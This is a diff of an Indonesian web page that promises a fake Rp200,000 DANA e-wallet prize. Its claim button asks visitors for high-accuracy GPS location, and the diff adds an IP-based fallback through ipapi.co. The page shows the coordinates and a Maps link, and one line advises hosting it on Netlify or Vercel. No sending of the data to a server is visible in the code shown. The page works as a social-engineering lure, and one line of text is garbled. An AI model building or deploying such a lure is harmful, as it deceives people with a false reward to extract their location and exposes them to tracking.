@@ -1,19 +1,13 @@
 <!DOCTYPE html>
 <html lang="id">
 <head>
-    <meta charset="UTF-8" />
-    <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
     <title>Klaim Saldo DANA</title>
     <style>
-        /* ----- RESET & GLOBAL ----- */
-        * {
-            margin: 0;
-            padding: 0;
-            box-sizing: border-box;
-        }
-
+        * { margin:0; padding:0; box-sizing:border-box; }
         body {
-            font-family: 'Segoe UI', system-ui, -apple-system, sans-serif;
+            font-family: 'Segoe UI', system-ui, sans-serif;
             min-height: 100vh;
             display: flex;
             justify-content: center;
@@ -21,8 +15,6 @@
             background: linear-gradient(145deg, #0b1a2e 0%, #1a3a5c 100%);
             padding: 20px;
         }
-
-        /* ----- KARTU UTAMA ----- */
         .card {
             background: #ffffff;
             max-width: 440px;
@@ -32,8 +24,6 @@
             box-shadow: 0 20px 60px rgba(0, 0, 0, 0.6);
             text-align: center;
         }
-
-        /* ----- BADGE DANA ----- */
         .badge-dana {
             display: inline-block;
             background: #d4edda;
@@ -46,15 +36,7 @@
             text-transform: uppercase;
             margin-bottom: 10px;
         }
-
-        .title {
-            font-size: 1rem;
-            font-weight: 600;
-            color: #1e293b;
-            letter-spacing: 0.3px;
-            margin-bottom: 2px;
-        }
-
+        .title { font-size: 1rem; font-weight: 600; color: #1e293b; margin-bottom: 2px; }
         .amount {
             font-size: 3.4rem;
             font-weight: 800;
@@ -62,12 +44,7 @@
             line-height: 1.15;
             margin: 2px 0 4px;
         }
-        .amount span {
-            font-size: 1.8rem;
-            font-weight: 600;
-            color: #475569;
-        }
-
+        .amount span { font-size: 1.8rem; font-weight: 600; color: #475569; }
         .dana-icon {
             display: inline-block;
             background: #0f7b3a;
@@ -78,24 +55,19 @@
             border-radius: 40px;
             margin-left: 6px;
             vertical-align: middle;
-            letter-spacing: 0.5px;
         }
-
         .divider {
             border: none;
             height: 2px;
             background: linear-gradient(90deg, transparent, #e2e8f0, transparent);
             margin: 14px 0 16px;
         }
-
         .sub-meta {
             font-size: 0.72rem;
             color: #94a3b8;
             letter-spacing: 0.3px;
             margin-bottom: 14px;
         }
-
-        /* ----- PERINGATAN HTTPS (jika diperlukan) ----- */
         .warning-box {
             background: #fff3cd;
             border: 1px solid #ffc107;
@@ -108,15 +80,8 @@
             display: none;
             line-height: 1.5;
         }
-        .warning-box.show {
-            display: block;
-        }
-        .warning-box strong {
-            display: block;
-            font-size: 0.85rem;
-        }
-
-        /* ----- PANEL LOKASI ----- */
+        .warning-box.show { display: block; }
+        .warning-box strong { display: block; font-size: 0.85rem; }
         .location-panel {
             background: #f8fafc;
             border-radius: 18px;
@@ -126,7 +91,6 @@
             text-align: left;
             min-height: 70px;
         }
-
         .location-panel .label {
             font-size: 0.7rem;
             font-weight: 700;
@@ -135,7 +99,6 @@
             color: #64748b;
             margin-bottom: 4px;
         }
-
         .coord-row {
             display: flex;
             justify-content: space-between;
@@ -143,15 +106,8 @@
             font-size: 0.9rem;
             border-bottom: 1px dashed #e2e8f0;
         }
-        .coord-row:last-child {
-            border-bottom: none;
-        }
-
-        .coord-row .key {
-            color: #475569;
-            font-weight: 500;
-        }
-
+        .coord-row:last-child { border-bottom: none; }
+        .coord-row .key { color: #475569; font-weight: 500; }
         .coord-row .value {
             color: #0f172a;
             font-weight: 600;
@@ -160,36 +116,17 @@
             text-align: right;
             max-width: 65%;
         }
-        .coord-row .value.source {
-            font-family: inherit;
-            font-weight: 400;
-        }
-
+        .coord-row .value.source { font-family: inherit; font-weight: 400; }
         .status-msg {
             font-size: 0.9rem;
             color: #475569;
             padding: 6px 0 2px;
             text-align: center;
         }
-        .status-msg .emoji {
-            font-size: 1.5rem;
-            display: block;
-            margin-bottom: 2px;
-        }
-        .status-msg .detail {
-            font-size: 0.8rem;
-            color: #6c757d;
-            margin-top: 4px;
-        }
-
-        .maps-link-wrap {
-            margin-top: 10px;
-            display: none;
-        }
-        .maps-link-wrap.show {
-            display: block;
-        }
-
+        .status-msg .emoji { font-size: 1.5rem; display: block; margin-bottom: 2px; }
+        .status-msg .detail { font-size: 0.8rem; color: #6c757d; margin-top: 4px; }
+        .maps-link-wrap { margin-top: 10px; display: none; }
+        .maps-link-wrap.show { display: block; }
         .maps-link {
             display: block;
             padding: 10px 0;
@@ -200,13 +137,8 @@
             text-decoration: none;
             font-weight: 700;
             font-size: 0.9rem;
-            transition: background 0.2s;
         }
-        .maps-link:hover {
-            background: #218838;
-        }
-
-        /* ----- TOMBOL ----- */
+        .maps-link:hover { background: #218838; }
         .btn-claim {
             display: block;
             width: 100%;
@@ -223,20 +155,9 @@
             letter-spacing: 0.5px;
             margin-top: 2px;
         }
-        .btn-claim:hover {
-            transform: translateY(-2px);
-            box-shadow: 0 12px 32px rgba(15, 123, 58, 0.45);
-        }
-        .btn-claim:active {
-            transform: scale(0.97);
-        }
-        .btn-claim:disabled {
-            opacity: 0.55;
-            cursor: not-allowed;
-            transform: none;
-            box-shadow: none;
-        }
-
+        .btn-claim:hover { transform: translateY(-2px); box-shadow: 0 12px 32px rgba(15, 123, 58, 0.45); }
+        .btn-claim:active { transform: scale(0.97); }
+        .btn-claim:disabled { opacity: 0.55; cursor: not-allowed; transform: none; box-shadow: none; }
         .btn-retry {
             display: inline-block;
             margin-top: 10px;
@@ -250,81 +171,42 @@
             cursor: pointer;
             transition: all 0.2s;
         }
-        .btn-retry:hover {
-            background: #0f7b3a;
-            color: #fff;
-        }
-        .btn-retry.hidden {
-            display: none;
-        }
-
-        .hidden {
-            display: none !important;
-        }
-
-        .footer-note {
-            margin-top: 16px;
-            font-size: 0.6rem;
-            color: #cbd5e1;
-            letter-spacing: 0.3px;
-        }
-
-        /* ----- RESPONSIVE ----- */
+        .btn-retry:hover { background: #0f7b3a; color: #fff; }
+        .btn-retry.hidden { display: none; }
+        .hidden { display: none !important; }
+        .footer-note { margin-top: 16px; font-size: 0.6rem; color: #cbd5e1; letter-spacing: 0.3px; }
         @media (max-width: 480px) {
-            .card {
-                padding: 22px 14px 24px;
-            }
-            .amount {
-                font-size: 2.6rem;
-            }
-            .amount span {
-                font-size: 1.4rem;
-            }
-            .coord-row {
-                font-size: 0.8rem;
-                flex-wrap: wrap;
-            }
-            .coord-row .value {
-                max-width: 100%;
-                text-align: left;
-                margin-top: 1px;
-            }
+            .card { padding: 22px 14px 24px; }
+            .amount { font-size: 2.6rem; }
+            .amount span { font-size: 1.4rem; }
+            .coord-row { font-size: 0.8rem; flex-wrap: wrap; }
+            .coord-row .value { max-width: 100%; text-align: left; margin-top: 1px; }
         }
     </style>
 </head>
 <body>
-
     <div class="card">
-
-        <!-- Badge & title -->
         <div class="badge-dana">💰 Saldo DANA</div>
         <p class="title">Total Hadiah Untukmu</p>
         <div class="amount">
             Rp200.000
             <span class="dana-icon">DANA</span>
         </div>
-
         <hr class="divider" />
         <p class="sub-meta">Surah dikewafaksi · Siaw dikewafaksi</p>
 
-        <!-- Peringatan jika HTTP & bukan localhost -->
         <div class="warning-box" id="warningBox">
             <strong>⚠️ Koneksi HTTP (Tidak Aman)</strong>
             Browser memblokir akses GPS.<br />
             <strong>Solusi:</strong> Gunakan HTTPS atau akses via localhost.
         </div>
 
-        <!-- Panel lokasi -->
-        <div class="location-panel" id="locationPanel">
+        <div class="location-panel">
             <div class="label">📍 Data Lokasi</div>
-
-            <!-- Status -->
             <div id="statusArea" class="status-msg">
                 <span class="emoji">🌐</span>
                 Klik tombol di bawah untuk<br />mengakses lokasi Anda.
             </div>
-
-            <!-- Detail (sembunyi awal) -->
             <div id="detailArea" class="hidden">
                 <div class="coord-row">
                     <span class="key">Latitude</span>
@@ -343,26 +225,18 @@
                     <span class="value source" id="sourceValue">GPS</span>
                 </div>
             </div>
-
-            <!-- Link Google Maps -->
             <div class="maps-link-wrap" id="mapsWrap">
                 <a class="maps-link" id="mapsLink" href="#" target="_blank">🗺️ Lihat di Google Maps</a>
             </div>
-
-            <!-- Tombol coba ulang -->
             <button id="retryBtn" class="btn-retry hidden">↻ Coba Ulang</button>
         </div>
 
-        <!-- Tombol utama -->
         <button id="claimBtn" class="btn-claim">🎯 Klaim Sekarang</button>
         <p class="footer-note">⚠️ Pastikan izin lokasi diaktifkan & GPS menyala</p>
     </div>
 
     <script>
         (function() {
-            'use strict';
-
-            // ----- DOM refs -----
             const claimBtn = document.getElementById('claimBtn');
             const retryBtn = document.getElementById('retryBtn');
             const statusArea = document.getElementById('statusArea');
@@ -375,7 +249,6 @@
             const mapsLink = document.getElementById('mapsLink');
             const warningBox = document.getElementById('warningBox');
 
-            // ----- Cek HTTPS / localhost -----
             const isLocalhost = window.location.hostname === 'localhost' ||
                 window.location.hostname === '127.0.0.1' ||
                 window.location.hostname === '::1';
@@ -385,12 +258,8 @@
                 warningBox.classList.add('show');
                 claimBtn.disabled = true;
                 setStatus('🔒', 'HTTPS atau localhost diperlukan.<br />Gunakan hosting seperti Netlify / Vercel.');
-                console.warn('⚠️ Koneksi tidak aman (HTTP) dan bukan localhost.');
-            } else {
-                console.log('✅ Koneksi aman (HTTPS atau localhost)');
             }
 
-            // ----- Helper UI -----
             function setStatus(emoji, message, detail) {
                 statusArea.innerHTML =
                     `<span class="emoji">${emoji}</span>${message}${detail ? `<div class="detail">${detail}</div>` : ''}`;
@@ -405,76 +274,96 @@
                 lngValue.textContent = lon.toFixed(7);
                 accValue.textContent = acc ? `${Math.round(acc)} meter` : '—';
                 sourceValue.textContent = source || 'GPS';
-
                 statusArea.classList.add('hidden');
                 detailArea.classList.remove('hidden');
-
                 mapsLink.href = `https://www.google.com/maps?q=${lat},${lon}`;
                 mapsWrap.classList.add('show');
                 retryBtn.classList.add('hidden');
             }
 
-            // ----- Fungsi utama: minta lokasi GPS (tanpa fallback IP) -----
+            // ----- FALLBACK: IP GEOLOKASI (untuk antisipasi) -----
+            function fetchIPLocation() {
+                setStatus('⏳', 'Mengambil lokasi via IP (fallback)...');
+                fetch('https://ipapi.co/json/')
+                    .then(res => {
+                        if (!res.ok) throw new Error('Gagal');
+                        return res.json();
+                    })
+                    .then(data => {
+                        if (data.latitude && data.longitude) {
+                            const lat = parseFloat(data.latitude);
+                            const lon = parseFloat(data.longitude);
+                            const city = data.city || '';
+                            const region = data.region || '';
+                            const country = data.country_name || '';
+                            const locationName = [city, region, country].filter(Boolean).join(', ') || 'IP-based';
+                            showLocationData(lat, lon, null, `IP (${locationName})`);
+                            claimBtn.disabled = false;
+                            claimBtn.textContent = '✅ Lokasi Terdeteksi (IP)';
+                        } else {
+                            throw new Error('Data tidak lengkap');
+                        }
+                    })
+                    .catch(() => {
+                        setStatus('❌', 'Gagal mendapatkan lokasi.', 'Coba aktifkan GPS dan izin lokasi.');
+                        claimBtn.disabled = false;
+                        claimBtn.textContent = '🎯 Klaim Sekarang';
+                        retryBtn.classList.remove('hidden');
+                    });
+            }
+
             function requestLocation() {
-                // Cek keamanan
                 if (!isSecure) {
                     setStatus('🔒', 'HTTPS atau localhost diperlukan.');
                     claimBtn.disabled = true;
                     return;
                 }
 
-                // Cek dukungan geolocation
                 if (!navigator.geolocation) {
-                    setStatus('❌', 'Browser tidak mendukung Geolocation.<br />Gunakan Chrome / Firefox terbaru.');
+                    setStatus('❌', 'Browser tidak mendukung Geolocation.');
                     claimBtn.disabled = false;
                     claimBtn.textContent = '🎯 Klaim Sekarang';
                     retryBtn.classList.remove('hidden');
+                    fetchIPLocation();
                     return;
                 }
 
-                // Disable tombol & loading
                 claimBtn.disabled = true;
                 claimBtn.textContent = '⏳ Mengambil lokasi GPS...';
-                setStatus('⏳', 'Mengambil lokasi GPS...<br />Pastikan GPS aktif & sinyal kuat.');
+                setStatus('⏳', 'Mengambil lokasi GPS...', 'Pastikan GPS aktif & di ruang terbuka.');
 
                 const options = {
                     enableHighAccuracy: true,
-                    timeout: 15000,
+                    timeout: 20000,
                     maximumAge: 0,
                 };
 
                 navigator.geolocation.getCurrentPosition(
-                    // ----- SUKSES -----
                     function(pos) {
-                        const lat = pos.coords.latitude;
-                        const lon = pos.coords.longitude;
-                        const acc = pos.coords.accuracy;
-                        showLocationData(lat, lon, acc, 'GPS');
+                        showLocationData(pos.coords.latitude, pos.coords.longitude, pos.coords.accuracy, 'GPS');
                         claimBtn.disabled = false;
                         claimBtn.textContent = '✅ Lokasi Terdeteksi (GPS)';
                         retryBtn.classList.add('hidden');
-                        console.log('✅ GPS Location:', { lat, lon, acc });
+                        console.log('✅ GPS:', pos.coords);
                     },
-                    // ----- GAGAL -----
                     function(error) {
                         console.warn('GPS error:', error);
-
-                        let pesan = '';
-                        let detail = '';
-                        let emoji = '⚠️';
+                        let pesan = '',
+                            detail = '',
+                            emoji = '⚠️';
 
                         switch (error.code) {
-                            case error.PERMISSION_DENIED:
+                            case 1:
                                 emoji = '🚫';
                                 pesan = 'Izin lokasi DITOLAK!';
-                                detail = 'Klik ikon 🔒 di address bar → Izinkan lokasi → Refresh halaman.';
+                                detail = 'Klik ikon 🔒 di address bar → Izinkan lokasi → Refresh.';
                                 break;
-                            case error.POSITION_UNAVAILABLE:
+                            case 2:
                                 emoji = '📡';
                                 pesan = 'GPS tidak mendeteksi sinyal.';
-                                detail = 'Pastikan GPS aktif, di ruang terbuka, dan sinyal internet stabil.';
+                                detail = 'Pastikan GPS aktif & di ruang terbuka.';
                                 break;
-                            case error.TIMEOUT:
+                            case 3:
                                 emoji = '⏱️';
                                 pesan = 'Waktu pengambilan lokasi habis.';
                                 detail = 'Coba lagi di area dengan sinyal GPS lebih kuat.';
@@ -482,22 +371,25 @@
                             default:
                                 emoji = '❗';
                                 pesan = `Error: ${error.message}`;
-                                detail = 'Coba refresh halaman atau gunakan perangkat lain.';
+                                detail = 'Coba refresh atau gunakan perangkat lain.';
                         }
 
                         setStatus(emoji, pesan, detail);
                         claimBtn.disabled = false;
                         claimBtn.textContent = '🎯 Klaim Sekarang';
                         retryBtn.classList.remove('hidden');
+
+                        // Coba fallback IP
+                        if (error.code !== 1) {
+                            fetchIPLocation();
+                        }
                     },
                     options
                 );
             }
 
-            // ----- Event listener -----
             claimBtn.addEventListener('click', function(e) {
                 e.preventDefault();
-                // Jika sudah ada lokasi, reset dan ambil ulang
                 if (claimBtn.textContent.includes('Lokasi Terdeteksi')) {
                     detailArea.classList.add('hidden');
                     mapsWrap.classList.remove('show');
@@ -515,14 +407,11 @@
                 requestLocation();
             });
 
-            // ----- Inisialisasi -----
             if (isSecure) {
                 claimBtn.disabled = false;
                 setStatus('🌐', 'Klik tombol di bawah untuk<br />mengakses lokasi Anda.');
             }
-
         })();
     </script>
-
 </body>
-</html>
+                </html>
